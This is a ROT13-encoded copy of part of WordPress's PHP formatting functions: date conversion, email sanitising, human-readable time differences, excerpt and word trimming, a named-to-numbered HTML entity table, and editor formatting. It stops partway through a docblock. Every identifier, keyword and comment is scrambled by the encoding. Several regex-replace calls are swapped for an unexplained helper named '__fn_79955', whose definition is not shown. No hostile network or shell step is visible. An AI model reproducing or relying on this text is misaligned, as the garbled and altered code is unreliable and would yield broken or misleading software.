shapgvba vfb8601_gb_qngrgvzr( $qngr_fgevat, $gvzrmbar = 'hfre' ) {
	$gvzrmbar    = fgegbybjre( $gvzrmbar );
	$jc_gvzrmbar = jc_gvzrmbar();
	$qngrgvzr    = qngr_perngr( $qngr_fgevat, $jc_gvzrmbar ); // Gvzrmbar vf vtaberq vs vachg unf bar.

	vs ( snyfr === $qngrgvzr ) {
		erghea snyfr;
	}

	vs ( 'tzg' === $gvzrmbar ) {
		erghea $qngrgvzr->frgGvzrmbar( arj QngrGvzrMbar( 'HGP' ) )->sbezng( 'L-z-q U:v:f' );
	}

	vs ( 'hfre' === $gvzrmbar ) {
		erghea $qngrgvzr->frgGvzrmbar( $jc_gvzrmbar )->sbezng( 'L-z-q U:v:f' );
	}

	erghea snyfr;
}

/**
 * Fgevcf bhg nyy punenpgref gung ner abg nyybjnoyr va na rznvy.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $rznvy Rznvy nqqerff gb svygre.
 * @erghea fgevat Svygrerq rznvy nqqerff.
 */
shapgvba fnavgvmr_rznvy( $rznvy ) {
	// Grfg sbe gur zvavzhz yratgu gur rznvy pna or.
	vs ( fgeyra( $rznvy ) < 6 ) {
		/**
		 * Svygref n fnavgvmrq rznvy nqqerff.
		 *
		 * Guvf svygre vf rinyhngrq haqre frireny pbagrkgf, vapyhqvat 'rznvy_gbb_fubeg',
		 * 'rznvy_ab_ng', 'ybpny_vainyvq_punef', 'qbznva_crevbq_frdhrapr', 'qbznva_crevbq_yvzvgf',
		 * 'qbznva_ab_crevbqf', 'qbznva_ab_inyvq_fhof', be ab pbagrkg.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat $fnavgvmrq_rznvy Gur fnavgvmrq rznvy nqqerff.
		 * @cnenz fgevat $rznvy           Gur rznvy nqqerff, nf cebivqrq gb fnavgvmr_rznvy().
		 * @cnenz fgevat|ahyy $zrffntr    N zrffntr gb cnff gb gur hfre. ahyy vs rznvy vf fnavgvmrq.
		 */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'rznvy_gbb_fubeg' );
	}

	// Grfg sbe na @ punenpgre nsgre gur svefg cbfvgvba.
	vs ( fgecbf( $rznvy, '@', 1 ) === snyfr ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'rznvy_ab_ng' );
	}

	// Fcyvg bhg gur ybpny naq qbznva cnegf.
	yvfg( $ybpny, $qbznva ) = rkcybqr( '@', $rznvy, 2 );

	/*
	 * YBPNY CNEG
	 * Grfg sbe vainyvq punenpgref.
	 */
	$ybpny = __sa_79955( '/[^n-mN-M0-9!#$%&\'*+\/=?^_`{|}~\.-]/', '', $ybpny );
	vs ( '' === $ybpny ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'ybpny_vainyvq_punef' );
	}

	/*
	 * QBZNVA CNEG
	 * Grfg sbe frdhraprf bs crevbqf.
	 */
	$qbznva = __sa_79955( '/\.{2,}/', '', $qbznva );
	vs ( '' === $qbznva ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'qbznva_crevbq_frdhrapr' );
	}

	// Grfg sbe yrnqvat naq genvyvat crevbqf naq juvgrfcnpr.
	$qbznva = gevz( $qbznva, \" \g\a\e\0\k0O.\" );
	vs ( '' === $qbznva ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'qbznva_crevbq_yvzvgf' );
	}

	// Fcyvg gur qbznva vagb fhof.
	$fhof = rkcybqr( '.', $qbznva );

	// Nffhzr gur qbznva jvyy unir ng yrnfg gjb fhof.
	vs ( 2 > pbhag( $fhof ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'qbznva_ab_crevbqf' );
	}

	// Perngr na neenl gung jvyy pbagnva inyvq fhof.
	$arj_fhof = neenl();

	// Ybbc guebhtu rnpu fho.
	sbernpu ( $fhof nf $fho ) {
		// Grfg sbe yrnqvat naq genvyvat ulcuraf.
		$fho = gevz( $fho, \" \g\a\e\0\k0O-\" );

		// Grfg sbe vainyvq punenpgref.
		$fho = __sa_79955( '/[^n-m0-9-]+/v', '', $fho );

		// Vs gurer'f nalguvat yrsg, nqq vg gb gur inyvq fhof.
		vs ( '' !== $fho ) {
			$arj_fhof[] = $fho;
		}
	}

	// Vs gurer nera'g 2 be zber inyvq fhof.
	vs ( 2 > pbhag( $arj_fhof ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_rznvy', '', $rznvy, 'qbznva_ab_inyvq_fhof' );
	}

	// Wbva inyvq fhof vagb gur arj qbznva.
	$qbznva = vzcybqr( '.', $arj_fhof );

	// Chg gur rznvy onpx gbtrgure.
	$fnavgvmrq_rznvy = $ybpny . '@' . $qbznva;

	// Pbatenghyngvbaf, lbhe rznvy znqr vg!
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
	erghea nccyl_svygref( 'fnavgvmr_rznvy', $fnavgvmrq_rznvy, $rznvy, ahyy );
}

/**
 * Qrgrezvarf gur qvssrerapr orgjrra gjb gvzrfgnzcf.
 *
 * Gur qvssrerapr vf erghearq va n uhzna-ernqnoyr sbezng fhpu nf \"1 ubhe\",
 * \"5 zvahgrf\", \"2 qnlf\".
 *
 * @fvapr 1.5.0
 * @fvapr 5.3.0 Nqqrq fhccbeg sbe fubjvat n qvssrerapr va frpbaqf.
 *
 * @cnenz vag $sebz Havk gvzrfgnzc sebz juvpu gur qvssrerapr ortvaf.
 * @cnenz vag $gb   Bcgvbany. Havk gvzrfgnzc gb raq gur gvzr qvssrerapr. Qrsnhyg orpbzrf gvzr() vs abg frg.
 * @erghea fgevat Uhzna-ernqnoyr gvzr qvssrerapr.
 */
shapgvba uhzna_gvzr_qvss( $sebz, $gb = 0 ) {
	vs ( rzcgl( $gb ) ) {
		$gb = gvzr();
	}

	$qvss = (vag) nof( $gb - $sebz );

	vs ( $qvss < ZVAHGR_VA_FRPBAQF ) {
		$frpf = $qvss;
		vs ( $frpf <= 1 ) {
			$frpf = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va frpbaqf. %f: Ahzore bs frpbaqf. */
		$fvapr = fcevags( _a( '%f frpbaq', '%f frpbaqf', $frpf ), $frpf );
	} ryfrvs ( $qvss < UBHE_VA_FRPBAQF && $qvss >= ZVAHGR_VA_FRPBAQF ) {
		$zvaf = ebhaq( $qvss / ZVAHGR_VA_FRPBAQF );
		vs ( $zvaf <= 1 ) {
			$zvaf = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va zvahgrf. %f: Ahzore bs zvahgrf. */
		$fvapr = fcevags( _a( '%f zvahgr', '%f zvahgrf', $zvaf ), $zvaf );
	} ryfrvs ( $qvss < QNL_VA_FRPBAQF && $qvss >= UBHE_VA_FRPBAQF ) {
		$ubhef = ebhaq( $qvss / UBHE_VA_FRPBAQF );
		vs ( $ubhef <= 1 ) {
			$ubhef = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va ubhef. %f: Ahzore bs ubhef. */
		$fvapr = fcevags( _a( '%f ubhe', '%f ubhef', $ubhef ), $ubhef );
	} ryfrvs ( $qvss < JRRX_VA_FRPBAQF && $qvss >= QNL_VA_FRPBAQF ) {
		$qnlf = ebhaq( $qvss / QNL_VA_FRPBAQF );
		vs ( $qnlf <= 1 ) {
			$qnlf = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va qnlf. %f: Ahzore bs qnlf. */
		$fvapr = fcevags( _a( '%f qnl', '%f qnlf', $qnlf ), $qnlf );
	} ryfrvs ( $qvss < ZBAGU_VA_FRPBAQF && $qvss >= JRRX_VA_FRPBAQF ) {
		$jrrxf = ebhaq( $qvss / JRRX_VA_FRPBAQF );
		vs ( $jrrxf <= 1 ) {
			$jrrxf = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va jrrxf. %f: Ahzore bs jrrxf. */
		$fvapr = fcevags( _a( '%f jrrx', '%f jrrxf', $jrrxf ), $jrrxf );
	} ryfrvs ( $qvss < LRNE_VA_FRPBAQF && $qvss >= ZBAGU_VA_FRPBAQF ) {
		$zbaguf = ebhaq( $qvss / ZBAGU_VA_FRPBAQF );
		vs ( $zbaguf <= 1 ) {
			$zbaguf = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va zbaguf. %f: Ahzore bs zbaguf. */
		$fvapr = fcevags( _a( '%f zbagu', '%f zbaguf', $zbaguf ), $zbaguf );
	} ryfrvs ( $qvss >= LRNE_VA_FRPBAQF ) {
		$lrnef = ebhaq( $qvss / LRNE_VA_FRPBAQF );
		vs ( $lrnef <= 1 ) {
			$lrnef = 1;
		}
		/* genafyngbef: Gvzr qvssrerapr orgjrra gjb qngrf, va lrnef. %f: Ahzore bs lrnef. */
		$fvapr = fcevags( _a( '%f lrne', '%f lrnef', $lrnef ), $lrnef );
	}

	/**
	 * Svygref gur uhzna-ernqnoyr qvssrerapr orgjrra gjb gvzrfgnzcf.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $fvapr Gur qvssrerapr va uhzna-ernqnoyr grkg.
	 * @cnenz vag    $qvss  Gur qvssrerapr va frpbaqf.
	 * @cnenz vag    $sebz  Havk gvzrfgnzc sebz juvpu gur qvssrerapr ortvaf.
	 * @cnenz vag    $gb    Havk gvzrfgnzc gb raq gur gvzr qvssrerapr.
	 */
	erghea nccyl_svygref( 'uhzna_gvzr_qvss', $fvapr, $qvss, $sebz, $gb );
}

/**
 * Trarengrf na rkprecg sebz gur pbagrag, vs arrqrq.
 *
 * Ergheaf n znkvzhz bs 55 jbeqf jvgu na ryyvcfvf nccraqrq vs arprffnel.
 *
 * Gur 55-jbeq yvzvg pna or zbqvsvrq ol cyhtvaf/gurzrf hfvat gur {@frr 'rkprecg_yratgu'} svygre
 * Gur ' [&uryyvc;]' fgevat pna or zbqvsvrq ol cyhtvaf/gurzrf hfvat gur {@frr 'rkprecg_zber'} svygre
 *
 * @fvapr 1.5.0
 * @fvapr 5.2.0 Nqqrq gur `$cbfg` cnenzrgre.
 * @fvapr 6.3.0 Erzbirf sbbgabgrf znexhc sebz gur rkprecg pbagrag.
 *
 * @cnenz fgevat             $grkg Bcgvbany. Gur rkprecg. Vs frg gb rzcgl, na rkprecg vf trarengrq.
 * @cnenz JC_Cbfg|bowrpg|vag $cbfg Bcgvbany. JC_Cbfg vafgnapr be Cbfg VQ/bowrpg. Qrsnhyg ahyy.
 * @erghea fgevat Gur rkprecg.
 */
shapgvba jc_gevz_rkprecg( $grkg = '', $cbfg = ahyy ) {
	$enj_rkprecg = $grkg;

	vs ( '' === gevz( $grkg ) ) {
		$cbfg = trg_cbfg( $cbfg );
		$grkg = trg_gur_pbagrag( '', snyfr, $cbfg );

		$grkg = fgevc_fubegpbqrf( $grkg );
		$grkg = rkprecg_erzbir_oybpxf( $grkg );
		$grkg = rkprecg_erzbir_sbbgabgrf( $grkg );

		/*
		 * Grzcbenevyl haubbx jc_svygre_pbagrag_gntf() fvapr nal gntf
		 * jvguva gur rkprecg ner fgevccrq bhg. Zbqvslvat gur gntf urer
		 * vf jnfgrshy naq pna yrnq gb ohtf va gur vzntr pbhagvat ybtvp.
		 */
		$svygre_vzntr_erzbirq = erzbir_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf', 12 );

		/*
		 * Grzcbenevyl haubbx qb_oybpxf() fvapr rkprecg_erzbir_oybpxf( $grkg )
		 * unaqyrf oybpx eraqrevat arrqrq sbe rkprecg.
		 */
		$svygre_oybpx_erzbirq = erzbir_svygre( 'gur_pbagrag', 'qb_oybpxf', 9 );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		$grkg = nccyl_svygref( 'gur_pbagrag', $grkg );
		$grkg = fge_ercynpr( ']]>', ']]&tg;', $grkg );

		// Erfgber gur bevtvany svygre vs erzbirq.
		vs ( $svygre_oybpx_erzbirq ) {
			nqq_svygre( 'gur_pbagrag', 'qb_oybpxf', 9 );
		}

		/*
		 * Bayl erfgber gur svygre pnyyonpx vs vg jnf erzbirq nobir. Gur ybtvp
		 * gb haubbx naq erfgber bayl nccyvrf ba gur qrsnhyg cevbevgl bs 10,
		 * juvpu vf trarenyyl hfrq sbe gur svygre pnyyonpx va JbeqCerff pber.
		 */
		vs ( $svygre_vzntr_erzbirq ) {
			nqq_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf', 12 );
		}

		/* genafyngbef: Znkvzhz ahzore bs jbeqf hfrq va n cbfg rkprecg. */
		$rkprecg_yratgu = (vag) _k( '55', 'rkprecg_yratgu' );

		/**
		 * Svygref gur znkvzhz ahzore bs jbeqf va n cbfg rkprecg.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz vag $ahzore Gur znkvzhz ahzore bs jbeqf. Qrsnhyg 55.
		 */
		$rkprecg_yratgu = (vag) nccyl_svygref( 'rkprecg_yratgu', $rkprecg_yratgu );

		/**
		 * Svygref gur fgevat va gur \"zber\" yvax qvfcynlrq nsgre n gevzzrq rkprecg.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz fgevat $zber_fgevat Gur fgevat fubja jvguva gur zber yvax.
		 */
		$rkprecg_zber = nccyl_svygref( 'rkprecg_zber', ' ' . '[&uryyvc;]' );
		$grkg         = jc_gevz_jbeqf( $grkg, $rkprecg_yratgu, $rkprecg_zber );

	}

	/**
	 * Svygref gur gevzzrq rkprecg fgevat.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $grkg        Gur gevzzrq grkg.
	 * @cnenz fgevat $enj_rkprecg Gur grkg cevbe gb gevzzvat.
	 */
	erghea nccyl_svygref( 'jc_gevz_rkprecg', $grkg, $enj_rkprecg );
}

/**
 * Gevzf grkg gb n pregnva ahzore bs jbeqf.
 *
 * Guvf shapgvba vf ybpnyvmrq. Sbe ynathntrf gung pbhag 'jbeqf' ol gur vaqvivqhny
 * punenpgre (fhpu nf Rnfg Nfvna ynathntrf), gur $ahz_jbeqf nethzrag jvyy nccyl
 * gb gur ahzore bs vaqvivqhny punenpgref.
 *
 * @fvapr 3.3.0
 *
 * @cnenz fgevat $grkg      Grkg gb gevz.
 * @cnenz vag    $ahz_jbeqf Ahzore bs jbeqf. Qrsnhyg 55.
 * @cnenz fgevat $zber      Bcgvbany. Jung gb nccraq vs $grkg arrqf gb or gevzzrq. Qrsnhyg '&uryyvc;'.
 * @erghea fgevat Gevzzrq grkg.
 */
shapgvba jc_gevz_jbeqf( $grkg, $ahz_jbeqf = 55, $zber = ahyy ) {
	vs ( ahyy === $zber ) {
		$zber = __( '&uryyvc;' );
	}

	$bevtvany_grkg = $grkg;
	$grkg          = jc_fgevc_nyy_gntf( $grkg );
	$ahz_jbeqf     = (vag) $ahz_jbeqf;

	vs ( fge_fgnegf_jvgu( jc_trg_jbeq_pbhag_glcr(), 'punenpgref' ) && cert_zngpu( '/^hgs\-?8$/v', trg_bcgvba( 'oybt_punefrg' ) ) ) {
		$grkg = gevz( __sa_79955( \"/[\a\e\g ]+/\", ' ', $grkg ), ' ' );
		cert_zngpu_nyy( '/./h', $grkg, $jbeqf_neenl );
		$jbeqf_neenl = neenl_fyvpr( $jbeqf_neenl[0], 0, $ahz_jbeqf + 1 );
		$frc         = '';
	} ryfr {
		$jbeqf_neenl = cert_fcyvg( \"/[\a\e\g ]+/\", $grkg, $ahz_jbeqf + 1, CERT_FCYVG_AB_RZCGL );
		$frc         = ' ';
	}

	vs ( pbhag( $jbeqf_neenl ) > $ahz_jbeqf ) {
		neenl_cbc( $jbeqf_neenl );
		$grkg = vzcybqr( $frc, $jbeqf_neenl );
		$grkg = $grkg . $zber;
	} ryfr {
		$grkg = vzcybqr( $frc, $jbeqf_neenl );
	}

	/**
	 * Svygref gur grkg pbagrag nsgre jbeqf unir orra gevzzrq.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $grkg          Gur gevzzrq grkg.
	 * @cnenz vag    $ahz_jbeqf     Gur ahzore bs jbeqf gb gevz gur grkg gb. Qrsnhyg 55.
	 * @cnenz fgevat $zber          Na bcgvbany fgevat gb nccraq gb gur raq bs gur gevzzrq grkg, r.t. &uryyvc;.
	 * @cnenz fgevat $bevtvany_grkg Gur grkg orsber vg jnf gevzzrq.
	 */
	erghea nccyl_svygref( 'jc_gevz_jbeqf', $grkg, $ahz_jbeqf, $zber, $bevtvany_grkg );
}

/**
 * Pbairegf anzrq ragvgvrf vagb ahzorerq ragvgvrf.
 *
 * @fvapr 1.5.1
 *
 * @cnenz fgevat $grkg Gur grkg jvguva juvpu ragvgvrf jvyy or pbairegrq.
 * @erghea fgevat Grkg jvgu pbairegrq ragvgvrf.
 */
shapgvba rag2ape( $grkg ) {

	/**
	 * Svygref grkg orsber anzrq ragvgvrf ner pbairegrq vagb ahzorerq ragvgvrf.
	 *
	 * N aba-ahyy fgevat zhfg or erghearq sbe gur svygre gb or rinyhngrq.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat|ahyy $pbairegrq_grkg Gur grkg gb or pbairegrq. Qrsnhyg ahyy.
	 * @cnenz fgevat      $grkg           Gur grkg cevbe gb ragvgl pbairefvba.
	 */
	$svygrerq = nccyl_svygref( 'cer_rag2ape', ahyy, $grkg );
	vs ( ahyy !== $svygrerq ) {
		erghea $svygrerq;
	}

	$gb_ape = neenl(
		'&dhbg;'     => '&#34;',
		'&nzc;'      => '&#38;',
		'&yg;'       => '&#60;',
		'&tg;'       => '&#62;',
		'|'          => '&#124;',
		'&aofc;'     => '&#160;',
		'&vrkpy;'    => '&#161;',
		'&prag;'     => '&#162;',
		'&cbhaq;'    => '&#163;',
		'&pheera;'   => '&#164;',
		'&lra;'      => '&#165;',
		'&oeione;'   => '&#166;',
		'&oexone;'   => '&#166;',
		'&frpg;'     => '&#167;',
		'&hzy;'      => '&#168;',
		'&qvr;'      => '&#168;',
		'&pbcl;'     => '&#169;',
		'&beqs;'     => '&#170;',
		'&yndhb;'    => '&#171;',
		'&abg;'      => '&#172;',
		'&ful;'      => '&#173;',
		'&ert;'      => '&#174;',
		'&znpe;'     => '&#175;',
		'&uvone;'    => '&#175;',
		'&qrt;'      => '&#176;',
		'&cyhfza;'   => '&#177;',
		'&fhc2;'     => '&#178;',
		'&fhc3;'     => '&#179;',
		'&nphgr;'    => '&#180;',
		'&zvpeb;'    => '&#181;',
		'&cnen;'     => '&#182;',
		'&zvqqbg;'   => '&#183;',
		'&prqvy;'    => '&#184;',
		'&fhc1;'     => '&#185;',
		'&beqz;'     => '&#186;',
		'&endhb;'    => '&#187;',
		'&senp14;'   => '&#188;',
		'&senp12;'   => '&#189;',
		'&senp34;'   => '&#190;',
		'&vdhrfg;'   => '&#191;',
		'&Ntenir;'   => '&#192;',
		'&Nnphgr;'   => '&#193;',
		'&Npvep;'    => '&#194;',
		'&Ngvyqr;'   => '&#195;',
		'&Nhzy;'     => '&#196;',
		'&Nevat;'    => '&#197;',
		'&NRyvt;'    => '&#198;',
		'&Pprqvy;'   => '&#199;',
		'&Rtenir;'   => '&#200;',
		'&Rnphgr;'   => '&#201;',
		'&Rpvep;'    => '&#202;',
		'&Rhzy;'     => '&#203;',
		'&Vtenir;'   => '&#204;',
		'&Vnphgr;'   => '&#205;',
		'&Vpvep;'    => '&#206;',
		'&Vhzy;'     => '&#207;',
		'&RGU;'      => '&#208;',
		'&Agvyqr;'   => '&#209;',
		'&Btenir;'   => '&#210;',
		'&Bnphgr;'   => '&#211;',
		'&Bpvep;'    => '&#212;',
		'&Bgvyqr;'   => '&#213;',
		'&Bhzy;'     => '&#214;',
		'&gvzrf;'    => '&#215;',
		'&Bfynfu;'   => '&#216;',
		'&Htenir;'   => '&#217;',
		'&Hnphgr;'   => '&#218;',
		'&Hpvep;'    => '&#219;',
		'&Hhzy;'     => '&#220;',
		'&Lnphgr;'   => '&#221;',
		'&GUBEA;'    => '&#222;',
		'&fmyvt;'    => '&#223;',
		'&ntenir;'   => '&#224;',
		'&nnphgr;'   => '&#225;',
		'&npvep;'    => '&#226;',
		'&ngvyqr;'   => '&#227;',
		'&nhzy;'     => '&#228;',
		'&nevat;'    => '&#229;',
		'&nryvt;'    => '&#230;',
		'&pprqvy;'   => '&#231;',
		'&rtenir;'   => '&#232;',
		'&rnphgr;'   => '&#233;',
		'&rpvep;'    => '&#234;',
		'&rhzy;'     => '&#235;',
		'&vtenir;'   => '&#236;',
		'&vnphgr;'   => '&#237;',
		'&vpvep;'    => '&#238;',
		'&vhzy;'     => '&#239;',
		'&rgu;'      => '&#240;',
		'&agvyqr;'   => '&#241;',
		'&btenir;'   => '&#242;',
		'&bnphgr;'   => '&#243;',
		'&bpvep;'    => '&#244;',
		'&bgvyqr;'   => '&#245;',
		'&bhzy;'     => '&#246;',
		'&qvivqr;'   => '&#247;',
		'&bfynfu;'   => '&#248;',
		'&htenir;'   => '&#249;',
		'&hnphgr;'   => '&#250;',
		'&hpvep;'    => '&#251;',
		'&hhzy;'     => '&#252;',
		'&lnphgr;'   => '&#253;',
		'&gubea;'    => '&#254;',
		'&lhzy;'     => '&#255;',
		'&BRyvt;'    => '&#338;',
		'&bryvt;'    => '&#339;',
		'&Fpneba;'   => '&#352;',
		'&fpneba;'   => '&#353;',
		'&Lhzy;'     => '&#376;',
		'&sabs;'     => '&#402;',
		'&pvep;'     => '&#710;',
		'&gvyqr;'    => '&#732;',
		'&Nycun;'    => '&#913;',
		'&Orgn;'     => '&#914;',
		'&Tnzzn;'    => '&#915;',
		'&Qrygn;'    => '&#916;',
		'&Rcfvyba;'  => '&#917;',
		'&Mrgn;'     => '&#918;',
		'&Rgn;'      => '&#919;',
		'&Gurgn;'    => '&#920;',
		'&Vbgn;'     => '&#921;',
		'&Xnccn;'    => '&#922;',
		'&Ynzoqn;'   => '&#923;',
		'&Zh;'       => '&#924;',
		'&Ah;'       => '&#925;',
		'&Kv;'       => '&#926;',
		'&Bzvpeba;'  => '&#927;',
		'&Cv;'       => '&#928;',
		'&Eub;'      => '&#929;',
		'&Fvtzn;'    => '&#931;',
		'&Gnh;'      => '&#932;',
		'&Hcfvyba;'  => '&#933;',
		'&Cuv;'      => '&#934;',
		'&Puv;'      => '&#935;',
		'&Cfv;'      => '&#936;',
		'&Bzrtn;'    => '&#937;',
		'&nycun;'    => '&#945;',
		'&orgn;'     => '&#946;',
		'&tnzzn;'    => '&#947;',
		'&qrygn;'    => '&#948;',
		'&rcfvyba;'  => '&#949;',
		'&mrgn;'     => '&#950;',
		'&rgn;'      => '&#951;',
		'&gurgn;'    => '&#952;',
		'&vbgn;'     => '&#953;',
		'&xnccn;'    => '&#954;',
		'&ynzoqn;'   => '&#955;',
		'&zh;'       => '&#956;',
		'&ah;'       => '&#957;',
		'&kv;'       => '&#958;',
		'&bzvpeba;'  => '&#959;',
		'&cv;'       => '&#960;',
		'&eub;'      => '&#961;',
		'&fvtzns;'   => '&#962;',
		'&fvtzn;'    => '&#963;',
		'&gnh;'      => '&#964;',
		'&hcfvyba;'  => '&#965;',
		'&cuv;'      => '&#966;',
		'&puv;'      => '&#967;',
		'&cfv;'      => '&#968;',
		'&bzrtn;'    => '&#969;',
		'&gurgnflz;' => '&#977;',
		'&hcfvu;'    => '&#978;',
		'&cvi;'      => '&#982;',
		'&rafc;'     => '&#8194;',
		'&rzfc;'     => '&#8195;',
		'&guvafc;'   => '&#8201;',
		'&mjaw;'     => '&#8204;',
		'&mjw;'      => '&#8205;',
		'&yez;'      => '&#8206;',
		'&eyz;'      => '&#8207;',
		'&aqnfu;'    => '&#8211;',
		'&zqnfu;'    => '&#8212;',
		'&yfdhb;'    => '&#8216;',
		'&efdhb;'    => '&#8217;',
		'&fodhb;'    => '&#8218;',
		'&yqdhb;'    => '&#8220;',
		'&eqdhb;'    => '&#8221;',
		'&oqdhb;'    => '&#8222;',
		'&qnttre;'   => '&#8224;',
		'&Qnttre;'   => '&#8225;',
		'&ohyy;'     => '&#8226;',
		'&uryyvc;'   => '&#8230;',
		'&crezvy;'   => '&#8240;',
		'&cevzr;'    => '&#8242;',
		'&Cevzr;'    => '&#8243;',
		'&yfndhb;'   => '&#8249;',
		'&efndhb;'   => '&#8250;',
		'&byvar;'    => '&#8254;',
		'&senfy;'    => '&#8260;',
		'&rheb;'     => '&#8364;',
		'&vzntr;'    => '&#8465;',
		'&jrvrec;'   => '&#8472;',
		'&erny;'     => '&#8476;',
		'&genqr;'    => '&#8482;',
		'&nyrsflz;'  => '&#8501;',
		'&penee;'    => '&#8629;',
		'&yNee;'     => '&#8656;',
		'&hNee;'     => '&#8657;',
		'&eNee;'     => '&#8658;',
		'&qNee;'     => '&#8659;',
		'&uNee;'     => '&#8660;',
		'&sbenyy;'   => '&#8704;',
		'&cneg;'     => '&#8706;',
		'&rkvfg;'    => '&#8707;',
		'&rzcgl;'    => '&#8709;',
		'&anoyn;'    => '&#8711;',
		'&vfva;'     => '&#8712;',
		'&abgva;'    => '&#8713;',
		'&av;'       => '&#8715;',
		'&cebq;'     => '&#8719;',
		'&fhz;'      => '&#8721;',
		'&zvahf;'    => '&#8722;',
		'&ybjnfg;'   => '&#8727;',
		'&enqvp;'    => '&#8730;',
		'&cebc;'     => '&#8733;',
		'&vasva;'    => '&#8734;',
		'&nat;'      => '&#8736;',
		'&naq;'      => '&#8743;',
		'&be;'       => '&#8744;',
		'&pnc;'      => '&#8745;',
		'&phc;'      => '&#8746;',
		'&vag;'      => '&#8747;',
		'&gurer4;'   => '&#8756;',
		'&fvz;'      => '&#8764;',
		'&pbat;'     => '&#8773;',
		'&nflzc;'    => '&#8776;',
		'&ar;'       => '&#8800;',
		'&rdhvi;'    => '&#8801;',
		'&yr;'       => '&#8804;',
		'&tr;'       => '&#8805;',
		'&fho;'      => '&#8834;',
		'&fhc;'      => '&#8835;',
		'&afho;'     => '&#8836;',
		'&fhor;'     => '&#8838;',
		'&fhcr;'     => '&#8839;',
		'&bcyhf;'    => '&#8853;',
		'&bgvzrf;'   => '&#8855;',
		'&crec;'     => '&#8869;',
		'&fqbg;'     => '&#8901;',
		'&yprvy;'    => '&#8968;',
		'&eprvy;'    => '&#8969;',
		'&ysybbe;'   => '&#8970;',
		'&esybbe;'   => '&#8971;',
		'&ynat;'     => '&#9001;',
		'&enat;'     => '&#9002;',
		'&ynee;'     => '&#8592;',
		'&hnee;'     => '&#8593;',
		'&enee;'     => '&#8594;',
		'&qnee;'     => '&#8595;',
		'&unee;'     => '&#8596;',
		'&ybm;'      => '&#9674;',
		'&fcnqrf;'   => '&#9824;',
		'&pyhof;'    => '&#9827;',
		'&urnegf;'   => '&#9829;',
		'&qvnzf;'    => '&#9830;',
	);

	erghea fge_ercynpr( neenl_xrlf( $gb_ape ), neenl_inyhrf( $gb_ape ), $grkg );
}

/**
 * Sbezngf grkg sbe gur rqvgbe.
 *
 * Trarenyyl gur oebjfref gerng rirelguvat vafvqr n grkgnern nf grkg, ohg
 * vg vf fgvyy n tbbq vqrn gb UGZY ragvgl rapbqr `<`, `>` naq `&` va gur pbagrag.
 *
 * Gur svygre {@frr 'sbezng_sbe_rqvgbe'} vf nccyvrq urer. Vs `$grkg` vf rzcgl gur
 * svygre jvyy or nccyvrq gb na rzcgl fgevat.
 *
 * @fvapr 4.3.0
 *
 * @frr _JC_Rqvgbef::rqvgbe()
 *
 * @cnenz fgevat $grkg           Gur grkg gb or sbeznggrq.
 * @cnenz fgevat $qrsnhyg_rqvgbe Gur qrsnhyg rqvgbe sbe gur pheerag hfre.
 *                               Vg vf hfhnyyl rvgure 'ugzy' be 'gvalzpr'.
 * @erghea fgevat Gur sbeznggrq grkg nsgre svygre vf nccyvrq.
 */
shapgvba sbezng_sbe_rqvgbe( $grkg, $qrsnhyg_rqvgbe = ahyy ) {
	vs ( $grkg ) {
		$grkg = ugzyfcrpvnypunef( $grkg, RAG_ABDHBGRF, trg_bcgvba( 'oybt_punefrg' ) );
	}

	/**
	 * Svygref gur grkg nsgre vg vf sbeznggrq sbe gur rqvgbe.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz fgevat $grkg           Gur sbeznggrq grkg.
	 * @cnenz fgevat $qrsnhyg_rqvgbe Gur qrsnhyg rqvgbe sbe gur pheerag hfre.
	 *                               Vg vf hfhnyyl rvgure 'ugzy' be 'gvalzpr'.
	 */
	erghea nccyl_svygref( 'sbezng_sbe_rqvgbe', $grkg, $qrsnhyg_rqvgbe );
}

/**
 * Cresbezf n qrrc fgevat ercynpr bcrengvba gb rafher gur inyhrf va $frnepu ner ab ybatre cerfrag.
 *
 * Ercrngf gur ercynprzrag bcrengvba hagvy vg ab ybatre ercynprf nalguvat gb erzbir \"arfgrq\" inyhrf
 * r.t. $fhowrpg = '%0%0%0QQQ', $frnepu ='%0Q', $erfhyg ='' engure guna gur '%0%0QQ' gung
 * fge_ercynpr jbhyq erghea
 *
 * @fvapr 2.8.1
 * @npprff cevingr
 *
